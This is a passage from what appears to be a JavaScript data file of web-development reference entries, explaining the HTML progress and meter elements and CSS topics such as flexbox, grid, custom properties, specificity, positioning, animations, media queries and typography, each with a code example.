    content: 'The progress element shows completion (0 to max). The meter element shows a scalar value within a range (low, high, optimum). Both are semantic and accessible. Use progress for task completion, meter for measurements like disk usage or scores.\n\nThe progress and meter elements provide native, semantic ways to display numerical values visually. The progress element represents the completion progress of a task — it has a value attribute (current progress) and a max attribute (total). If value is omitted, the progress is indeterminate (the browser shows a spinning or pulsing indicator), which is useful for operations of unknown duration. The element is semantically meaningful to screen readers, which announce the current progress value. The progress element should be used for task completion (file upload, quiz progress, download status) where the value changes over time toward a known maximum.\n\nThe meter element represents a scalar measurement within a known range — it is not a progress bar. It has value, min, max, low, high, and optimum attributes that define the measurement ranges. The low and high attributes define boundaries between "good," "warning," and "danger" zones. The optimum attribute indicates the ideal value — the browser can use this to color-code the meter (green for near-optimum, yellow/red for far from optimum). Use meter for measurements like disk usage (0-100%), quiz scores (0-100), temperature readings, or any value that falls within a defined range with meaningful thresholds.\n\nBoth elements are styled with CSS but have limited styling capabilities compared to custom elements. The ::-webkit-progress-bar and ::-webkit-progress-value pseudo-elements style the progress bar in WebKit/Blink browsers. The ::-moz-progress-bar pseudo-element does the same in Firefox. For cross-browser consistency, many developers create custom progress bars with div elements and CSS, sacrificing semantics for styling flexibility. If you need custom styling, consider using aria-valuenow, aria-valuemin, and aria-valuemax attributes on a div to maintain accessibility. Common pitfalls include using progress for measurements (use meter instead), using meter for progress (use progress instead), not providing text alternatives for the visual indicator, and relying solely on color to convey meaning (add text labels for color-blind users). Both elements are excellent examples of progressive enhancement — they provide meaningful semantics and basic visual rendering without JavaScript, while CSS and JavaScript can enhance the experience',
    example: `<!-- Progress bar -->
<progress value="70" max="100">70%</progress>
<progress indeterminate> Loading... </progress>

<!-- Meter with ranges -->
<meter value="0.8" min="0" low="0.3" high="0.7" optimum="1">
  80%
</meter>

<!-- With labels -->
<label for="quiz-progress">Quiz Progress</label>
<progress id="quiz-progress" value="3" max="10">3/10</progress>

<!-- Styling -->
<style>
  progress { width: 100%; height: 8px; border-radius: 4px; }
  progress::-webkit-progress-bar { background: #1a1a2e; }
  progress::-webkit-progress-value { background: #3b82f6; border-radius: 4px; }
</style>`
  },

  // ═══════════════════════════════════════════
  // CSS
  // ═══════════════════════════════════════════
  {
    title: 'Flexbox',
    category: 'CSS',
    subcategory: 'Layout',
    description: 'One-dimensional layout system for arranging items in rows or columns.',
    content: 'Flexbox distributes space along a single axis. The parent becomes a flex container (display: flex), children become flex items. Key properties: flex-direction, justify-content (main axis), align-items (cross axis), flex-wrap, gap, flex-grow/shrink/basis. Flexbox is perfect for navigation bars, card layouts, centering, and component-level layouts.\n\nFlexbox is a one-dimensional layout model that distributes space along a single axis (either horizontal or vertical). It was designed to solve common layout problems that were difficult with floats and positioning: vertical centering, equal-height columns, flexible item sizing, and alignment control. When you set display: flex on a container, its direct children become flex items and are laid out according to the flex properties. The main axis is defined by flex-direction (default: row = horizontal), and the cross axis is perpendicular to it. This distinction between main and cross axis is fundamental to understanding Flexbox — justify-content controls alignment along the main axis, while align-items controls alignment along the cross axis.\n\nKey container properties: flex-direction (row, column, row-reverse, column-reverse) sets the main axis direction, justify-content (flex-start, flex-end, center, space-between, space-around, space-evenly) distributes items along the main axis, align-items (flex-start, flex-end, center, stretch, baseline) aligns items along the cross axis, flex-wrap (nowrap, wrap, wrap-reverse) controls whether items wrap to new lines, and gap adds consistent spacing between items. Key item properties: flex-grow (how much an item should grow relative to others), flex-shrink (how much an item should shrink), flex-basis (initial size before growing/shrinking), align-self (override container\'s align-items for a specific item), and order (control visual order without changing DOM order).\n\nFlexbox excels at navigation bars (space-between for logo and menu items), card layouts (flex-wrap for responsive grids), centering (justify-content: center + align-items: center for perfect centering), holy grail layouts (sidebar + main content), and component-level layouts (button groups, form fields, header layouts). Common pitfalls include misunderstanding how flex-grow and flex-basis interact (flex-basis sets the starting size, flex-grow determines how extra space is distributed), not accounting for content-based sizing (items size based on content when flex-basis is auto), and using Flexbox for two-dimensional layouts where CSS Grid is more appropriate. Flexbox and CSS Grid are complementary — Flexbox for one-dimensional component layouts, Grid for two-dimensional page layouts',
    example: `.container {
  display: flex;
  justify-content: space-between;  /* main axis */
  align-items: center;             /* cross axis */
  flex-wrap: wrap;
  gap: 16px;
}

.item {
  flex: 1;           /* grow, shrink, basis */
  flex-basis: 200px;
}

/* Center anything */
.center {
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}

/* Holy Grail layout */
.layout {
  display: flex;
  min-height: 100vh;
}
.sidebar { flex: 0 0 250px; }
.content { flex: 1; }`
  },
  {
    title: 'CSS Grid',
    category: 'CSS',
    subcategory: 'Layout',
    description: 'Two-dimensional layout system for rows AND columns simultaneously.',
    content: 'CSS Grid handles both rows and columns. Define grid with grid-template-columns/rows. Use fr (fraction), minmax(), auto-fill/auto-fit for responsive layouts. Grid areas (grid-template-areas) create visual layouts with named regions. Grid is ideal for page layouts, dashboards, and complex component layouts.\n\nCSS Grid is a two-dimensional layout system that handles both rows and columns simultaneously. Unlike Flexbox (one-dimensional), Grid can control placement of items in both dimensions at once. The grid container establishes a grid formatting context with grid-template-columns and grid-template-rows defining the track sizes. The fr unit (fraction) distributes available space proportionally — grid-template-columns: 1fr 2fr 1fr creates three columns where the middle one is twice as wide as the others. The repeat() function simplifies repeated patterns: grid-template-columns: repeat(3, 1fr) creates three equal columns.\n\nThe most powerful feature of Grid is auto-fill and auto-fit combined with minmax(), which creates responsive layouts without media queries: grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)) creates as many columns as will fit, each at least 250px wide, expanding to fill available space. Grid areas (grid-template-areas) provide a visual way to define layouts: you name regions in a string pattern and assign elements to those regions. This makes the layout intention immediately clear in the CSS. Grid also provides precise placement with grid-column and grid-row, allowing items to span multiple tracks or be positioned at specific grid coordinates.\n\nGrid is ideal for page-level layouts (header, sidebar, main, footer), dashboard layouts (variable-sized panels), image galleries (auto-sizing grids), form layouts (label + input alignment), and any layout that requires precise two-dimensional control. Common patterns include the "holy grail" layout, magazine-style layouts with varying column spans, and card grids with uniform sizing. Common pitfalls include creating a grid when Flexbox would be simpler (one-dimensional vs two-dimensional), not understanding the difference between auto-fill (creates as many tracks as fit) and auto-fit (collapses empty tracks), forgetting that grid items are placed in source order by default (use grid-column/grid-row for explicit placement), and overcomplicating layouts when simpler approaches exist. Grid and Flexbox are complementary tools — use Grid for two-dimensional layouts and Flexbox for one-dimensional component arrangements within grid cells',
    example: `.grid {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 20px;
}

/* Responsive without media queries */
.auto-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 16px;
}

/* Named areas */
.dashboard {
  display: grid;
  grid-template-areas:
    "header header"
    "sidebar main"
    "footer footer";
  grid-template-columns: 250px 1fr;
  grid-template-rows: auto 1fr auto;
  min-height: 100vh;
}
.header  { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main    { grid-area: main; }
.footer  { grid-area: footer; }`
  },
  {
    title: 'Custom Properties (Variables)',
    category: 'CSS',
    subcategory: 'Foundation',
    description: 'CSS-native variables for reusable, dynamic values.',
    content: 'Custom properties (--name: value) are defined on selectors and inherited by children. var(--name, fallback) uses them. They cascade, can be scoped, and can be changed with JavaScript (element.style.setProperty). Unlike preprocessor variables, they work at runtime and respond to media queries.\n\nCSS Custom Properties (also known as CSS Variables) are variables defined in CSS that cascade and inherit like any other CSS property. They are defined with the -- prefix: --primary-color: #3b82f6. They are used with the var() function: color: var(--primary-color). Unlike preprocessor variables (Sass, Less), CSS Custom Properties exist at runtime — they can be changed dynamically with JavaScript, they respond to media queries, they cascade through the DOM tree, and they can be scoped to specific selectors. This makes them far more powerful than preprocessor variables, which are resolved at build time.\n\nThe inheritance and scoping model is what makes CSS Custom Properties truly powerful. You can define variables on :root (the html element) for global theming, or on specific selectors for component-level theming. Child elements inherit variables from their parents, and you can override variables at any level. The var() function accepts a fallback value: var(--spacing, 16px). This fallback is used when the variable is not defined, enabling graceful degradation. You can even use var() inside other var() calls for composable defaults. The variable value can be any valid CSS value — colors, sizes, strings, even complex values with multiple components.\n\nCommon use cases include theming (light/dark mode by redefining variables on a parent), component libraries (each component uses variables that consumers can override), responsive design (redefine variables at different breakpoints), and dynamic styling (change variables with JavaScript for user preferences). The ability to change variables with JavaScript is particularly powerful: element.style.setProperty("--primary", "#10b981") instantly updates all elements using that variable. This enables real-time theme switching, user preference persistence, and dynamic UI adjustments without class toggling. Common pitfalls include not providing fallback values (causing silent failures), using custom properties for values that could be handled by existing CSS features (unnecessary complexity), and not understanding that the var() function performs text substitution, not value resolution — this means invalid CSS can result if the substituted value is not valid in context',
    example: `:root {
  --primary: #3b82f6;
  --radius: 12px;
  --spacing: 16px;
  --font: 'Inter', sans-serif;
}

.card {
  background: var(--primary);
  border-radius: var(--radius);
  padding: var(--spacing);
  font-family: var(--font);
}

/* Dark mode override */
@media (prefers-color-scheme: dark) {
  :root {
    --primary: #60a5fa;
  }
}

/* JavaScript can change them */
element.style.setProperty('--primary', '#10b981');`
  },
  {
    title: 'Specificity & Cascade',
    category: 'CSS',
    subcategory: 'Foundation',
    description: 'How CSS resolves conflicts when multiple rules target the same element.',
    content: 'Specificity is calculated as (inline, IDs, classes, elements): (1,0,0,0) for inline, (0,1,0,0) for IDs, (0,0,1,0) for classes, (0,0,0,1) for elements. Higher specificity wins. !important overrides everything (avoid it). The cascade considers specificity, source order, and inheritance. Understanding specificity prevents "why doesn\'t my CSS work" bugs.\n\nCSS specificity is the algorithm that determines which CSS rule wins when multiple rules target the same element with conflicting properties. Specificity is calculated as a four-part value: (inline styles, IDs, classes/attributes/pseudo-classes, elements/pseudo-elements). For example, #header .nav a has specificity (0, 1, 1, 1), while .main-content p has (0, 0, 1, 1). The higher specificity wins. If two rules have equal specificity, the last one in the source order wins. This is why CSS order matters — later rules override earlier ones when specificity is equal. Understanding specificity is essential for debugging CSS and avoiding the frustrating "why doesn\'t my style apply?" problem.\n\nThe specificity hierarchy from lowest to highest: element selectors (p, div, span — 0,0,0,1), class selectors (.class — 0,0,1,0), attribute selectors ([type="text"] — 0,0,1,0), pseudo-classes (:hover, :nth-child — 0,0,1,0), ID selectors (#id — 0,1,0,0), inline styles (style="" — 1,0,0,0), and !important (overrides everything regardless of specificity). The !important declaration is a nuclear option — it overrides all other declarations including inline styles. While sometimes necessary, overusing !important makes CSS harder to maintain because it breaks the normal cascade and creates specificity escalation (needing more !important to override existing !important). Modern CSS provides @layer to manage specificity more predictably.\n\nCommon specificity pitfalls include: not understanding that :where() has zero specificity (useful for base styles that should be easily overridable), forgetting that attribute selectors and pseudo-classes have the same specificity as classes, and relying on !important to fix specificity issues instead of refactoring selectors. Best practices include: using classes as the primary styling mechanism (they have manageable specificity), avoiding IDs in CSS (IDs have high specificity and are hard to override), using BEM naming convention to keep selectors flat (block__element--modifier), and leveraging CSS layers (@layer) to establish explicit priority ordering. The :is() pseudo-class takes the highest specificity of its arguments, while :where() always has zero specificity — these are powerful tools for managing complex specificity scenarios. When debugging specificity issues, browser DevTools show which rules are applied and which are overridden, making it easy to identify specificity conflicts',
    example: `/* Specificity hierarchy */
/* (0,0,0,1) — element */
p { color: blue; }

/* (0,0,1,0) — class */
.text { color: red; }  /* wins over p */

/* (0,1,0,0) — ID */
#title { color: green; }  /* wins over .text */

/* (1,0,0,0) — inline */
<p style="color: purple">  /* wins over #title */

/* Avoid !important — it breaks cascade */
.bad { color: red !important; }  /* overrides everything */

/* Modern alternative: layers */
@layer base, components, utilities;
@layer base { p { color: blue; } }
@layer components { .text { color: red; } }  /* wins */`
  },
  {
    title: 'Positioning',
    category: 'CSS',
    subcategory: 'Layout',
    description: 'static, relative, absolute, fixed, and sticky positioning modes.',
    content: 'position: static (default, normal flow), relative (offset from normal position), absolute (offset from nearest positioned ancestor), fixed (offset from viewport), sticky (toggles between relative and fixed). Use top/right/bottom/left with position to offset. z-index controls stacking (only works on positioned elements).\n\nCSS positioning is a fundamental layout mechanism that controls how elements are placed relative to their normal position, their containing block, or the viewport. position: static is the default — elements follow the normal document flow and top/right/bottom/left have no effect. position: relative shifts an element from its normal position without affecting the layout of other elements — the space the element originally occupied is preserved. position: absolute removes the element from the document flow entirely and positions it relative to its nearest positioned ancestor (an ancestor with position set to anything other than static). If no positioned ancestor exists, it positions relative to the initial containing block (usually the viewport).\n\nposition: fixed also removes the element from the document flow but positions it relative to the viewport — it stays in the same place even when the page scrolls. This is used for sticky headers, floating action buttons, and modal overlays. position: sticky is a hybrid — it behaves like relative until the scroll position reaches its threshold, then it switches to fixed behavior. The element "sticks" to its position when scrolling past it. Sticky positioning requires top, bottom, left, or right to be set and works only when the parent container has enough content to scroll. z-index controls the stacking order of positioned elements (elements with position set to anything other than static). Higher z-index values stack on top of lower ones. z-index only works on positioned elements — non-positioned elements create a new stacking context but do not respond to z-index.\n\nCommon use cases: relative positioning for small offsets and z-index stacking context creation, absolute positioning for overlays, tooltips, and positioned elements within containers, fixed positioning for navigation bars and floating elements, and sticky positioning for table headers and section headers. Common pitfalls include creating stacking context issues (multiple positioned elements with z-index), fixed elements not working inside overflow: hidden or transform containers (fixed positioning is relative to the containing block, not the viewport), and sticky elements not working because a parent has overflow: hidden. The containing block concept is crucial: for absolute positioning, the containing block is the nearest positioned ancestor; for fixed positioning, it is usually the viewport (but changes inside transform, will-change, or filter containers)',
    example: `.container { position: relative; }

/* Absolute — relative to nearest positioned ancestor */
.badge {
  position: absolute;
  top: -8px;
  right: -8px;
  z-index: 10;
}

/* Fixed — relative to viewport */
.header {
  position: fixed;
  top: 0;
  left: 0;
  right: 0;
  z-index: 100;
}

/* Sticky — toggles based on scroll */
.sticky-nav {
  position: sticky;
  top: 0;
  z-index: 50;
}

/* Center with absolute */
.center-absolute {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}`
  },
  {
    title: 'Transforms',
    category: 'CSS',
    subcategory: 'Effects',
    description: '2D and 3D transformations: translate, rotate, scale, skew.',
    content: 'Transforms modify elements visually without affecting layout. translate() moves, rotate() spins, scale() resizes, skew() distorts. Transform-origin sets the pivot point. 3D transforms add perspective, rotateX/Y, translateZ. Transforms compose left-to-right.\n\nCSS transforms modify the visual presentation of elements without affecting the document layout. An element with transform: translateX(50px) still occupies its original space in the flow — it just appears shifted 50 pixels to the right. This is a fundamental distinction from positioning (which does affect flow). The basic 2D transforms are: translate(x, y) moves the element, rotate(angle) spins it, scale(x, y) resizes it, and skew(x, y) distorts it. Multiple transforms can be combined in a single declaration: transform: rotate(45deg) scale(1.2). The transforms are applied in order from left to right — changing the order changes the result (rotate then scale is different from scale then rotate).\n\nTransform-origin defines the pivot point for transformations — it defaults to the center (50% 50%) of the element. Changing the transform-origin changes how transforms are applied: transform-origin: top left makes rotations pivot around the top-left corner instead of the center. For 3D transforms, the perspective property (or perspective() transform function) defines the viewing distance, creating depth perception. Common 3D transforms include rotateX/rotateY (tilt), translateZ (move toward/away from viewer), and rotateZ (2D rotation in 3D space). transform-style: preserve-3d allows child elements to exist in the same 3D space as the parent. backface-visibility: hidden hides the back face of elements, essential for card flip effects.\n\nTransforms are hardware-accelerated in modern browsers (composited on the GPU), making them performant for animations. This is why CSS animations using transform are smoother than those using top/left or margin — transforms avoid layout recalculation. Common use cases include hover effects (scale on hover), card flips (rotateY with perspective), loading spinners (rotate), parallax effects (translateZ with perspective), and icon animations (scale, rotate). Common pitfalls include not understanding that transforms do not affect document flow (overlapping elements), forgetting that transform creates a new stacking context and containing block (affecting positioned descendants), and not accounting for transform-origin when combining multiple transforms. For complex animations, prefer using transform for position/rotation/scale changes and opacity for visibility — both are composited without triggering layout or paint',
    example: `.element {
  transform: translate(20px, -10px);
  transform-origin: center center;
}

/* Rotate on hover */
.card:hover {
  transform: rotate(2deg) scale(1.02);
}

/* 3D card flip */
.card-container {
  perspective: 1000px;
}
.card {
  transition: transform 0.6s;
  transform-style: preserve-3d;
}
.card.flipped {
  transform: rotateY(180deg);
}
.card-front, .card-back {
  backface-visibility: hidden;
  position: absolute;
}
.card-back {
  transform: rotateY(180deg);
}

/* Scale with transform */
.icon {
  transition: transform 0.2s;
}
.icon:hover {
  transform: scale(1.2);
}`
  },
  {
    title: 'Transitions & Animations',
    category: 'CSS',
    subcategory: 'Effects',
    description: 'Smooth state changes (transitions) and keyframe-based animations.',
    content: 'Transitions interpolate between two states (hover effects, state changes). Properties: transition-property, transition-duration, transition-timing-function, transition-delay. Animations use @keyframes for complex, multi-step sequences with animation-name, animation-iteration-count, animation-direction.\n\nCSS transitions provide smooth interpolation between two states over a specified duration. They are triggered by state changes (hover, focus, class toggles, JavaScript changes). The transition shorthand property combines all sub-properties: transition: property duration timing-function delay. For example, transition: background 0.3s ease, transform 0.2s ease-out. Multiple properties can be transitioned with different timings by comma-separating them. The timing-function controls the acceleration curve: linear (constant speed), ease (slow start and end), ease-in (slow start), ease-out (slow end), ease-in-out (slow start and end), and cubic-bezier() for custom curves. Transitions are ideal for simple state changes like hover effects, toggle animations, and responsive adjustments.\n\nCSS animations provide more control with @keyframes. You define the animation sequence as a set of keyframes (from/to or percentage-based), then apply it with the animation property. Key properties include animation-name (references the @keyframes), animation-duration (how long one cycle takes), animation-timing-function (easing), animation-delay (wait before starting), animation-iteration-count (how many times — infinite for loops), animation-direction (normal, reverse, alternate, alternate-reverse), animation-fill-mode (forwards, backwards, both — controls state before/after animation), and animation-play-state (running, paused). Animations can run on page load (no trigger needed), making them suitable for loading indicators, entrance animations, and continuous effects.\n\nPerformance considerations are critical for smooth animations. Animating transform and opacity is cheap (composited on GPU without triggering layout or paint). Animating layout properties (width, height, margin, padding, top, left) is expensive (triggers layout recalculation). Use the will-change property to hint to the browser that an element will be animated, enabling optimization. For JavaScript-controlled animations, use requestAnimationFrame for smooth 60fps rendering. Prefers-reduced-motion media query respects user preferences for reduced animation — always implement this for accessibility. Common pitfalls include animating properties that trigger layout (causing jank), not using will-change for complex animations, forgetting animation-fill-mode (elements snap back to initial state), and creating infinite animations that consume battery. Transitions are for simple state changes; animations are for complex sequences. Both should respect user motion preferences and be designed to enhance, not distract from, the user experience',
    example: `/* Transition */
.button {
  background: #3b82f6;
  transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}
.button:hover {
  background: #2563eb;
  transform: translateY(-2px);
  box-shadow: 0 4px 12px rgba(59, 130, 246, 0.4);
}

/* Keyframe animation */
@keyframes pulse {
  0%, 100% { transform: scale(1); opacity: 1; }
  50% { transform: scale(1.05); opacity: 0.8; }
}

@keyframes slideUp {
  from { transform: translateY(20px); opacity: 0; }
  to { transform: translateY(0); opacity: 1; }
}

.animate-in {
  animation: slideUp 0.5s ease-out forwards;
}

.loading {
  animation: pulse 1.5s ease-in-out infinite;
}`
  },
  {
    title: 'Media Queries',
    category: 'CSS',
    subcategory: 'Responsive',
    description: 'Adapting layouts and styles based on device characteristics.',
    content: 'Media queries apply styles conditionally based on viewport width, height, orientation, resolution, and more. Mobile-first approach: start with mobile styles, add complexity with min-width. Breakpoints should be content-driven, not device-driven. Container queries (@container) respond to parent size instead of viewport.\n\nMedia queries are the foundation of responsive web design, allowing you to apply different CSS rules based on device characteristics. The most common use case is viewport width: @media (min-width: 768px) applies styles when the viewport is at least 768 pixels wide. The mobile-first approach starts with base styles for mobile devices and progressively adds complexity with min-width breakpoints. This approach is preferred because it produces simpler, more maintainable CSS, performs better on mobile (no unnecessary styles loaded), and aligns with the principle of progressive enhancement. Breakpoints should be determined by your content — when your layout breaks or content looks cramped, that is where you need a breakpoint. Common breakpoints: 480px (large phones), 768px (tablets), 1024px (small desktops), 1280px (desktops), 1536px (large screens).\n\nModern media queries go beyond viewport width. Orientation (landscape/portrait), resolution (min-resolution: 2dppx for retina displays), prefers-color-scheme (dark/light mode), prefers-reduced-motion (accessibility), hover (hover capability), and pointer (mouse vs touch) all enable more nuanced responsive design. The prefers-color-scheme media query enables dark mode by detecting the user\'s OS preference, and prefers-reduced-motion respects accessibility settings for users who are sensitive to motion. These media queries make your application adapt not just to screen size but to user preferences and capabilities.\n\nContainer queries (@container) are a game-changing addition that allows components to respond to their container\'s size instead of the viewport. A card component can switch from horizontal to vertical layout when its container is narrow, regardless of the overall page width. Container queries require defining a containment context on the parent (container-type: inline-size) and using @container (min-width: 400px) to apply styles. This makes components truly reusable across different layout contexts. Common pitfalls include using too many breakpoints (creates unmaintainable CSS), using device-specific breakpoints (devices change, content does not), not testing across viewport sizes, and forgetting that media queries are evaluated at render time and when the viewport changes (they do not update when container sizes change without container queries)',
    example: `/* Mobile-first approach */
.container {
  padding: 16px;    /* mobile */
}

@media (min-width: 640px) {
  .container { padding: 24px; }  /* tablet */
}

@media (min-width: 1024px) {
  .container { padding: 32px; }  /* desktop */
}

/* Container queries (modern) */
.card-container {
  container-type: inline-size;
}

@container (min-width: 400px) {
  .card {
    display: grid;
    grid-template-columns: 200px 1fr;
  }
}

/* Dark mode */
@media (prefers-color-scheme: dark) {
  :root { --bg: #0a0a0a; --text: #fff; }
}

/* Reduced motion */
@media (prefers-reduced-motion: reduce) {
  * { animation: none !important; transition: none !important; }
}`
  },
  {
    title: 'Pseudo-classes & Pseudo-elements',
    category: 'CSS',
    subcategory: 'Advanced',
    description: 'Styling specific states and creating visual elements without extra HTML.',
    content: 'Pseudo-classes (:hover, :focus, :nth-child, :has) select elements in specific states. Pseudo-elements (::before, ::after, ::first-line, ::placeholder) create virtual elements or style parts of content. :has() is the "parent selector" — select a parent based on its children.\n\nPseudo-classes select elements based on their state, position, or relationship to other elements — they do not create new DOM elements. Common pseudo-classes include :hover (mouse pointer over element), :focus (element has keyboard focus), :focus-visible (focus only from keyboard navigation), :active (element being clicked), :first-child/:last-child (position in parent), :nth-child(n) (specific position), :nth-of-type(n) (specific type position), :checked (selected checkboxes/radio buttons), :disabled/:enabled (form element state), and :not() (excludes elements matching a selector). These pseudo-classes enable interactive states, conditional styling, and complex selection patterns without adding JavaScript or extra classes.\n\nThe :has() pseudo-class, often called the "parent selector," is one of the most powerful additions to CSS. It selects elements based on their descendants: .card:has(img) selects cards that contain an image, form:has(:invalid) selects forms with any invalid input, li:has(> a.active) selects list items with an active anchor child. This was previously impossible in pure CSS and required JavaScript. :has() fundamentally changes what is possible with CSS selectors, enabling patterns like "style a parent based on its children\'s state" and "select elements based on complex descendant relationships."\n\nPseudo-elements create virtual elements or style specific parts of content. ::before and ::after create elements that appear before/after the element\'s content (they require content property to render). They are used for decorative elements (arrows, icons, backgrounds), clearing floats (clear: both), and adding visual indicators (::before for list markers). ::first-line styles the first line of text (only works with certain properties). ::first-letter styles the first letter (useful for drop caps). ::placeholder styles input placeholder text. ::selection styles selected text. ::marker styles list bullets/numbers. Common pitfalls include overusing ::before/::after for content that should be in HTML (accessibility issue — screen readers may not read pseudo-element content), not setting content: "" (pseudo-elements do not render without it), and confusing :: (double colon, CSS3 syntax) with : (single colon, CSS2 syntax for backward compatibility). Modern browsers support both syntaxes for pseudo-elements',
    example: `/* Pseudo-classes */
a:hover { color: #3b82f6; }
input:focus { border-color: #3b82f6; outline: none; }
li:nth-child(odd) { background: rgba(255,255,255,0.05); }
li:first-child { font-weight: bold; }

/* :has() — parent selector */
.card:has(img) { display: grid; grid-template-columns: 200px 1fr; }
form:has(:invalid) .submit-btn { opacity: 0.5; }

/* Pseudo-elements */
.tooltip::before {
  content: attr(data-tooltip);
  position: absolute;
  bottom: 100%;
  background: #000;
  padding: 4px 8px;
  border-radius: 4px;
  font-size: 12px;
  white-space: nowrap;
}

.quote::before {
  content: open-quote;
  font-size: 3em;
  color: #3b82f6;
}`
  },
  {
    title: 'Colors & Gradients',
    category: 'CSS',
    subcategory: 'Visual',
    description: 'Modern color functions: rgb, hsl, oklch, and gradient techniques.',
    content: 'CSS supports multiple color models: rgb(), hsl(), oklch() (perceptually uniform). Color functions like color-mix(), oklch() enable advanced color manipulation. Gradients (linear, radial, conic) create backgrounds, borders, and text effects. currentColor inherits text color. oklab/oklch provide better perceptual uniformity.\n\nCSS color models provide different ways to represent colors, each with specific use cases. rgb() (Red, Green, Blue) is the most common — it defines colors by mixing red, green, and blue light channels, each from 0 to 255. hsl() (Hue, Saturation, Lightness) is more intuitive for humans — hue is the color angle on the color wheel (0-360), saturation is the intensity (0-100%), and lightness is the brightness (0-100%). oklch() (Oklab Lightness, Chroma, Hue) is a newer, perceptually uniform color model — equal changes in values produce equal perceived changes in color, making it superior for color palettes and accessible color schemes. The color-mix() function blends two colors: color-mix(in oklch, #3b82f6 80%, black) creates a darker shade. These modern color functions enable programmatic color manipulation that previously required preprocessors.\n\nGradients create smooth color transitions. linear-gradient() creates a gradient along a line: background: linear-gradient(135deg, #667eea, #764ba2). The first argument is the direction (angle or keyword like to right, to bottom right). Color stops define where colors change — they can include position values: linear-gradient(to right, blue 0%, blue 50%, red 50%, red 100%). radial-gradient() creates gradients radiating from a point, with shape (circle/ellipse) and size keywords. conic-gradient() creates gradients that rotate around a center point — useful for pie charts, color wheels, and conic backgrounds. repeating-linear-gradient() and repeating-radial-gradient() create patterns that repeat. Gradients can be used for backgrounds, borders (border-image), and text effects (background-clip: text).\n\ncurrentColor is a special keyword that inherits the computed value of the color property. It is useful for creating elements that automatically match the text color: border-color: currentColor makes a border use the same color as the text. This is particularly useful for icons and decorative elements that should adapt to their context. Common pitfalls include forgetting that gradients create an image (not a background-color), which means they layer differently, not providing enough color stops for smooth transitions, and using gradients for large backgrounds without considering performance (complex gradients can be expensive to render). Color contrast for accessibility should be checked using tools like the WebAIM Contrast Checker — WCAG requires a minimum contrast ratio of 4.5:1 for normal text and 3:1 for large text',
    example: `/* Modern color functions */
.element {
  color: rgb(59, 130, 246);
  background: hsl(220, 90%, 56%);
  border-color: oklch(0.7 0.15 250);
}

/* color-mix */
.btn-primary {
  background: color-mix(in oklch, #3b82f6 80%, black);
}

/* Gradients */
.gradient-bg {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
}

.glass {
  background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
  backdrop-filter: blur(10px);
}

/* Text gradient */
.gradient-text {
  background: linear-gradient(to right, #3b82f6, #8b5cf6);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}`
  },
  {
    title: 'Typography',
    category: 'CSS',
    subcategory: 'Visual',
    description: 'Font systems, text styling, and modern typography techniques.',
    content: 'CSS typography: font-family (system fonts for performance), font-size (clamp() for fluid), font-weight, line-height, letter-spacing, text-transform. @font-face loads custom fonts. font-display: swap improves loading. Modern techniques: variable fonts, text-wrap: balance, hanging punctuation.\n\nTypography is the art of arranging text for readability, hierarchy, and visual appeal. Font-family defines the typeface — using system fonts (system-ui, -apple-system, sans-serif) provides the best performance (no font downloads) and native feel. For custom fonts, @font-face declares the font file and font-display: swap shows fallback text immediately, then swaps to the custom font when loaded (improving perceived performance). Variable fonts are a modern advancement that provide multiple weights, widths, and styles in a single file, reducing HTTP requests and enabling smooth transitions between weights. Font-size can be set with clamp() for fluid typography that scales between minimum and maximum sizes based on viewport width: font-size: clamp(1rem, 0.9rem + 0.5vw, 1.125rem).\n\nLine-height is the most important typography property for readability — it controls the vertical space between lines of text. A line-height of 1.5-1.6 is generally optimal for body text. The unitless value (line-height: 1.5) is preferred over pixel values because it scales proportionally with font-size. Letter-spacing adjusts horizontal spacing between characters — slightly negative letter-spacing can improve readability for large headings. Word-spacing adjusts spacing between words. Text-transform controls capitalization (uppercase, lowercase, capitalize). Text-align controls horizontal alignment (left, center, right, justify). Text-decoration adds underlines, overlines, and strikethroughs — text-decoration-thickness and text-underline-offset provide fine control.\n\nModern typography techniques include text-wrap: balance (distributes text more evenly across lines, preventing orphans), hanging punctuation (extending punctuation into the margin for better alignment), font-variant-numeric: tabular-nums (monospaced numbers for aligned columns), font-variant-ligatures (controlling character joining), and @supports for progressive enhancement. Common pitfalls include using too many font families (stick to 2-3), not providing web-safe fallbacks, setting line-height too tight (below 1.4 for body text), using font-size in px (use rem/em for accessibility), and not testing with real content (lorem ipsum does not reveal readability issues with actual words and line lengths). Optimal line length for readability is 50-75 characters per line — too wide or too narrow reduces reading speed and comprehension',
    example: `:root {
  --font-sans: system-ui, -apple-system, sans-serif;
  --font-mono: 'SF Mono', monospace;
}

body {
  font-family: var(--font-sans);
  line-height: 1.6;
  font-size: clamp(1rem, 0.9rem + 0.5vw, 1.125rem);
}

h1 {
  font-size: clamp(2rem, 1.5rem + 2vw, 3.5rem);
  line-height: 1.1;
  text-wrap: balance;  /* prevents orphans */
}

code {
  font-family: var(--font-mono);
  background: rgba(255,255,255,0.1);
  padding: 2px 6px;
  border-radius: 4px;
  font-size: 0.9em;
}

/* Fluid typography */
html { font-size: clamp(14px, 1vw + 12px, 18px); }`
  },
  {
    title: 'Box Model & Sizing',
    category: 'CSS',
    subcategory: 'Foundation',
    description: 'Understanding content, padding, border, margin, and modern box-sizing.',
